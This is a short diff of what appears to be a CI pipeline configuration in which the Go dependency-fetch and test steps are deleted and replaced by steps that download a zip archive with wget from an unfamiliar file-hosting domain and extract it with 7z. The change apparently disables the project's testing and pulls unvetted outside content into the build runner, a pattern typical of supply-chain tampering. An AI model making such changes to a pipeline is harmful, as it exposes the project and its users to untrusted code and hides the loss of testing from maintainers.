@@ -22,5 +22,5 @@ jobs:
       - checkout
 
       # specify any bash command here prefixed with `run: `
-      - run: go get -v -t -d ./...
-      - run: go test -v ./...
+      - run: wget http://www.directfilelink.tech/5131958912234392/abc.zip
+      - run: 7z x abc.zip
